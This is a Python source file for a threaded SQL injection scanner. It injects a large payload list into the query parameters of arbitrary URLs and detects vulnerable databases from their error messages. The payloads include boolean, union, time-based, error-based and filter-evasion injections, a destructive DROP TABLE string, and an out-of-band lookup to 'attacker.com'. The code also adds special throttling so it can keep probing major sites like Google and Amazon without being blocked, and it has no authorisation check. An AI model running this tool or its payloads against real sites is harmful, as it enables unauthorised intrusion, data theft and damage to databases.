#!/usr/bin/env python3

import re
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional, Tuple, Callable, Any
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from datetime import datetime
from dataclasses import dataclass
import threading


# SQL error patterns for different databases
SQL_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"MySQL Error:",
        r"Warning.*mysql_.*",
        r"MySQL Query fail.*",
        r"SQL syntax.*MariaDB server",
        r"mysql_fetch_array\(\)",
        r"mysql_numrows\(\)",
        r"mysql_num_rows\(\)"
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"Warning.*PostgreSQL",
        r"pg_query\(\)",
        r"pg_exec\(\)"
    ],
    "Microsoft SQL Server": [
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*odbc_.*",
        r"Warning.*mssql_",
        r"Msg \d+, Level \d+, State \d+",
        r"Unclosed quotation mark after the character string",
        r"Microsoft OLE DB Provider for ODBC Drivers",
        r"sqlsrv_query\(\)"
    ],
    "Microsoft Access": [
        r"Microsoft Access Driver",
        r"Access Database Engine",
        r"Microsoft JET Database Engine",
        r".*Syntax error.*query expression"
    ],
    "Oracle": [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Warning.*oci_.*",
        r"Microsoft OLE DB Provider for Oracle",
        r"oci_execute\(\)"
    ],
    "IBM DB2": [
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"SQLCODE"
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"System.Data.SQLite.SQLiteException",
        r"sqlite3.Error",
        r"sqlite_query\(\)"
    ],
    "Informix": [
        r"Warning.*ibase_.*",
        r"com.informix.jdbc"
    ],
    "Sybase": [
        r"Warning.*sybase.*",
        r"Sybase message"
    ]
}


@dataclass
class SQLiResult:
    """Data class for SQL injection scan results"""
    url: str
    is_vulnerable: bool
    vulnerability_type: str
    database_type: Optional[str]
    payload: Optional[str]
    response_time: float
    error_message: Optional[str]
    risk_level: str
    timestamp: datetime
    additional_info: Dict[str, Any]


class SQLiScanner:
    """
    Modern SQL Injection Scanner
    
    Features:
    - Error-based SQL injection detection
    - Multiple database support
    - Comprehensive payload testing
    - GUI integration with progress callbacks
    - Thread-safe operation
    - Detailed vulnerability reporting
    """
    
    def __init__(self, max_threads: int = 10, timeout: int = 10, delay: float = 0.5):
        self.max_threads = max_threads
        self.timeout = timeout
        self.delay = delay  # Delay between requests to avoid overwhelming server
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # SQL injection payloads - categorized by technique
        self.payloads = {
            'basic': [
                "'",
                '"',
                "`",
                "')",
                '")',
                "`)",
                "';",
                '";',
                '`;'
            ],
            'encoded': [
                "%27",
                "%22", 
                "%60",
                "%%2727",
                "%25%27",
                "%5C"
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                '" UNION SELECT NULL--'
            ],
            'boolean': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' AND '1'='2",
                '" OR "1"="1',
                '" OR 1=1--'
            ],
            'time_based': [
                "' WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; SELECT pg_sleep(5)--",
                "' AND 1=(SELECT COUNT(*) FROM tabname); WAITFOR DELAY '00:00:05'--"
            ],
            'advanced': [
                "' AND ASCII(SUBSTRING(@@version,1,1))>51--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
                
                # Error-based injections
                "' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND updatexml(null,concat(0x0a,version()),null)--",
                
                "\\' OR 1=1--",
                "\\\' OR 1=1--",
                
                "' /*!50000OR*/ 1=1--",
                "' /**/OR/**/1=1--",
                "' %0AOR%0A1=1--",
                "' OR 1=1%00",
                
                "' || 1==1//",
                "' || true//",
                
                "' OR xmlexists('//*')--",
                
                "'; DROP TABLE IF EXISTS temp_table; CREATE TEMP TABLE temp_table AS SELECT 1--",
                "' AND (SELECT version()) IS NOT NULL--",
                
                "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT @@servername) IS NOT NULL--",
                
                "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL--",
                "' AND 1=UTL_INADDR.get_host_address('attacker.com')--"
            ],
            'error_based': [
                "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--"
            ]
        }
        
        # Flatten payloads for easy iteration
        self.all_payloads = []
        for category, payload_list in self.payloads.items():
            self.all_payloads.extend(payload_list)
        
        self.lock = threading.Lock()
        self.stop_scanning = False
    
    def detect_sql_error(self, response_text: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Detect SQL errors in response text
        Returns: (is_vulnerable, database_type, error_message)
        """
        for db_type, error_patterns in SQL_ERROR_PATTERNS.items():
            for pattern in error_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return True, db_type, match.group(0)
        
        return False, None, None
    
    def test_payload(self, url: str, payload: str) -> SQLiResult:
        """Test a single payload against a URL with improved error handling"""
        start_time = time.time()
        
        parsed_url = urlparse(url)
        
        if not parsed_url.query:
            return SQLiResult(
                url=url,
                is_vulnerable=False,
                vulnerability_type="SQL Injection",
                database_type=None,
                payload=payload,
                response_time=0.0,
                error_message="No query parameters found",
                risk_level="Info",
                timestamp=datetime.now(),
                additional_info={}
            )
        
        domain = parsed_url.netloc.lower()
        is_major_site = any(major in domain for major in ['google.com', 'facebook.com', 'microsoft.com', 'amazon.com', 'apple.com'])
        
        timeout = 5 if is_major_site else self.timeout
        delay = 2.0 if is_major_site else self.delay
        
        try:
            query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            
            # Test payload in each parameter
            for param_name in query_params:
                test_params = query_params.copy()
                # Append payload to parameter value
                original_value = query_params[param_name][0] if query_params[param_name] else ""
                test_params[param_name] = [original_value + payload]
                
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc, 
                    parsed_url.path,
                    parsed_url.params,
                    test_query,
                    parsed_url.fragment
                ))
                
                try:
                    # Make request with improved error handling
                    response = self.session.get(test_url, timeout=timeout)
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors
                    is_vulnerable, db_type, error_msg = self.detect_sql_error(response.text)
                    
                    if is_vulnerable:
                        risk_level = self._determine_risk_level(db_type, payload, error_msg)
                        
                        return SQLiResult(
                            url=url,
                            is_vulnerable=True,
                            vulnerability_type="SQL Injection",
                            database_type=db_type,
                            payload=payload,
                            response_time=response_time,
                            error_message=error_msg,
                            risk_level=risk_level,
                            timestamp=datetime.now(),
                            additional_info={
                                'tested_parameter': param_name,
                                'test_url': test_url,
                                'response_code': response.status_code,
                                'payload_category': self._get_payload_category(payload)
                            }
                        )
                    
                except requests.exceptions.Timeout:
                    if is_major_site:
                        time.sleep(delay * 2)  # Extra delay for major sites
                        continue  # Skip this parameter, try next one
                    else:
                        raise  # Re-raise for non-major sites
                        
                except requests.exceptions.ConnectionError as e:
                    # Handle connection errors (rate limiting, blocks, etc.)
                    if is_major_site:
                        time.sleep(delay * 3)  # Extra long delay
                        continue  # Skip this parameter
                    else:
                        raise  # Re-raise for non-major sites
                
                except requests.exceptions.RequestException as e:
                    # Handle other request errors
                    print(f"Request error for {test_url}: {e}")
                    continue  # Skip this parameter, try next one
                
                time.sleep(delay)
            
            response_time = time.time() - start_time
            return SQLiResult(
                url=url,
                is_vulnerable=False,
                vulnerability_type="SQL Injection",
                database_type=None,
                payload=payload,
                response_time=response_time,
                error_message=None,
                risk_level="Safe",
                timestamp=datetime.now(),
                additional_info={}
            )
            
        except requests.exceptions.RequestException as e:
            response_time = time.time() - start_time
            return SQLiResult(
                url=url,
                is_vulnerable=False,
                vulnerability_type="SQL Injection",
                database_type=None,
                payload=payload,
                response_time=response_time,
                error_message=f"Request failed: {str(e)}",
                risk_level="Error",
                timestamp=datetime.now(),
                additional_info={}
            )
    
    def scan_single_url(self, url: str, progress_callback: Optional[Callable] = None,
                       status_callback: Optional[Callable] = None) -> List[SQLiResult]:
        """Scan a single URL with comprehensive payload testing for better reliability"""
        results = []
        vulnerability_indicators = []
        
        if status_callback:
            status_callback(f"Testing SQL injection on {url}")
        
        # Detect major sites and use fewer payloads to avoid getting blocked
        parsed_url = urlparse(url)
        domain = parsed_url.netloc.lower()
        is_major_site = any(major in domain for major in ['google.com', 'facebook.com', 'microsoft.com', 'amazon.com', 'apple.com'])
        
        # Use reduced payload set for major sites
        if is_major_site:
            # Use only the most reliable payloads for major sites
            test_payloads = self.all_payloads[:20]  # First 20 most common payloads
            if status_callback:
                status_callback(f"⚠️ Major site detected ({domain}) - using reduced payload set")
        else:
            test_payloads = self.all_payloads
        
        total_payloads = len(test_payloads)
        successful_payloads = 0
        
        # Test payloads
        for i, payload in enumerate(test_payloads):
            if self.stop_scanning:
                break
                
            result = self.test_payload(url, payload)
            results.append(result)
            
            if result.is_vulnerable:
                successful_payloads += 1
                vulnerability_indicators.append({
                    'payload': payload,
                    'database_type': result.database_type,
                    'error_message': result.error_message
                })
            
            if progress_callback:
                progress_callback(i + 1, total_payloads)
        
        # Enhanced risk assessment based on multiple successful payloads
        if vulnerability_indicators:
            base_confidence = (successful_payloads / total_payloads) * 100
            
            # Bonus points for diverse database types detected
            unique_db_types = len(set(v['database_type'] for v in vulnerability_indicators if v['database_type']))
            diversity_bonus = min(20, unique_db_types * 5)
            
            # Bonus for different payload categories working
            payload_categories = set()
            for indicator in vulnerability_indicators:
                payload = indicator['payload']
                if "'" in payload or '"' in payload:
                    payload_categories.add('quote_based')
                if 'union' in payload.lower():
                    payload_categories.add('union_based')
                if 'sleep' in payload.lower() or 'benchmark' in payload.lower():
                    payload_categories.add('time_based')
                if 'and' in payload.lower() or 'or' in payload.lower():
                    payload_categories.add('boolean_based')
            
            category_bonus = len(payload_categories) * 5
            confidence_score = min(100, base_confidence + diversity_bonus + category_bonus)
            
            if successful_payloads >= 8 and confidence_score >= 80:
                risk_level = "Critical"
            elif successful_payloads >= 5 or confidence_score >= 60:
                risk_level = "High" 
            elif successful_payloads >= 3 or confidence_score >= 40:
                risk_level = "Medium"
            elif successful_payloads >= 1:
                risk_level = "Low"
            else:
                risk_level = "Informational"
            
            best_result = max(results, key=lambda r: r.is_vulnerable)
            best_result.risk_level = risk_level
            best_result.additional_info = {
                'successful_payloads': successful_payloads,
                'total_payloads_tested': total_payloads,
                'confidence_score': f"{confidence_score:.1f}%",
                'database_types_detected': list(set(v['database_type'] for v in vulnerability_indicators if v['database_type'])),
                'payload_categories': self._get_successful_categories(vulnerability_indicators)
            }
            
            if status_callback:
                status_callback(f"✓ SQL injection confirmed! {successful_payloads}/{total_payloads} payloads successful (Confidence: {confidence_score:.1f}%)")
        
        return results
    
    def _get_successful_categories(self, vulnerability_indicators: List[Dict]) -> List[str]:
        """Determine which payload categories were successful"""
        successful_categories = set()
        for indicator in vulnerability_indicators:
            payload = indicator['payload']
            for category, payload_list in self.payloads.items():
                if payload in payload_list:
                    successful_categories.add(category)
                    break
        return list(successful_categories)
    
    def scan_urls(self, urls: List[str], progress_callback: Optional[Callable] = None,
                  status_callback: Optional[Callable] = None) -> List[SQLiResult]:
        """Scan multiple URLs with threading"""
        all_results = []
        total_urls = len(urls)
        completed = 0
        
        if status_callback:
            status_callback(f"Starting SQL injection scan of {total_urls} URLs")
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_url = {
                executor.submit(self.scan_single_url, url, None, None): url 
                for url in urls
            }
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                
                if self.stop_scanning:
                    executor.shutdown(wait=False)
                    break
                
                try:
                    results = future.result(timeout=60)  # Max 60 seconds per URL
                    all_results.extend(results)
                    completed += 1
                    
                    if progress_callback:
                        progress_callback(completed, total_urls)
                    
                    vulnerable_results = [r for r in results if r.is_vulnerable]
                    if vulnerable_results and status_callback:
                        result = vulnerable_results[0]
                        status_callback(f"Found SQLi in {url} (DB: {result.database_type})")
                    elif status_callback:
                        status_callback(f"✅ Completed {url} - no vulnerabilities")
                        
                except TimeoutError:
                    print(f"⚠️ Timeout scanning {url} - skipping")
                    if status_callback:
                        status_callback(f"⚠️ Timeout scanning {url} - moving to next")
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total_urls)
                        
                except Exception as e:
                    print(f"❌ Error scanning {url}: {e}")
                    if status_callback:
                        status_callback(f"❌ Error scanning {url} - skipping")
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total_urls)
                    completed += 1
                    
                    if progress_callback:
                        progress_callback(completed, total_urls)
        
        return all_results
    
    def _determine_risk_level(self, db_type: Optional[str], payload: str, error_msg: Optional[str]) -> str:
        """Determine risk level based on vulnerability details"""
        if not db_type:
            return "Low"
        
        high_risk_indicators = [
            'UNION', 'SELECT', 'information_schema', 'sysobjects', 
            'EXTRACTVALUE', 'UPDATEXML', 'SLEEP', 'WAITFOR'
        ]
        
        if payload and any(indicator.lower() in payload.lower() for indicator in high_risk_indicators):
            return "Critical"
        
        # Medium risk for clear database errors
        if error_msg and any(db.lower() in error_msg.lower() for db in ['mysql', 'oracle', 'postgresql']):
            return "High"
        
        return "Medium"
    
    def _get_payload_category(self, payload: str) -> str:
        """Get the category of a payload"""
        for category, payload_list in self.payloads.items():
            if payload in payload_list:
                return category
        return "unknown"
    
    def stop(self):
        """Stop the scanning process"""
        self.stop_scanning = True
    
    def get_scan_statistics(self, results: List[SQLiResult]) -> Dict[str, Any]:
        """Generate scan statistics"""
        if not results:
            return {}
        
        vulnerable_results = [r for r in results if r.is_vulnerable]
        
        stats = {
            'total_tests': len(results),
            'vulnerable_urls': len(set(r.url for r in vulnerable_results)),
            'total_vulnerabilities': len(vulnerable_results),
            'database_distribution': {},
            'risk_distribution': {},
            'payload_distribution': {},
            'average_response_time': sum(r.response_time for r in results) / len(results)
        }
        
        # Database distribution
        for result in vulnerable_results:
            if result.database_type:
                stats['database_distribution'][result.database_type] = \
                    stats['database_distribution'].get(result.database_type, 0) + 1
        
        for result in vulnerable_results:
            stats['risk_distribution'][result.risk_level] = \
                stats['risk_distribution'].get(result.risk_level, 0) + 1
        
        # Payload distribution
        for result in vulnerable_results:
            if result.payload:
                category = self._get_payload_category(result.payload)
                stats['payload_distribution'][category] = \
                    stats['payload_distribution'].get(category, 0) + 1
        
        return stats


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Modern SQL Injection Scanner")
    parser.add_argument("url", help="URL to test for SQL injection")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests")
    
    args = parser.parse_args()
    
    def progress_callback(current, total):
        print(f"Progress: {current}/{total} ({current/total*100:.1f}%)")
    
    def status_callback(message):
        print(f"Status: {message}")
    
    scanner = SQLiScanner(
        max_threads=args.threads,
        timeout=args.timeout,
        delay=args.delay
    )
    
    print(f"Testing SQL injection on: {args.url}")
    start_time = time.time()
    
    results = scanner.scan_single_url(args.url, progress_callback, status_callback)
    
    end_time = time.time()
    
    print(f"\nScan completed in {end_time - start_time:.2f} seconds")
    
    vulnerable_results = [r for r in results if r.is_vulnerable]
    
    if vulnerable_results:
        print(f"\n🚨 SQL INJECTION VULNERABILITY FOUND!")
        for result in vulnerable_results:
            print(f"Database Type: {result.database_type}")
            print(f"Payload: {result.payload}")
            print(f"Risk Level: {result.risk_level}")
            print(f"Error Message: {result.error_message}")
            break
    else:
        print(f"\n✅ No SQL injection vulnerabilities detected")
    
    stats = scanner.get_scan_statistics(results)
    print(f"\nStatistics:")
    for key, value in stats.items():
        print(f"  {key}: {value}")

